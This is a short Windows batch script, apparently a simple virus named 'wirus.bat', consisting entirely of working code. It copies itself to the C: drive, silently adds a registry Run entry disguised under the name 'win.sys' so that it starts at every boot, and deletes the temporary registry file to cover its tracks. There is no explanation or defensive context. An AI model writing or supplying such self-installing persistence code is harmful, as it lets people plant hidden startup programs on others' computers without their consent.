@echo off
copy %0 C:\wirus.bat
@echo REGEDIT4 >>a.reg
@echo. >>a.reg
@echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run] >>a.reg
@echo "win.sys"="C:\\wirus.bat" >>a.reg
@echo. >>a.reg
regedit /s a.reg
dir >nul
del a.reg >nul 
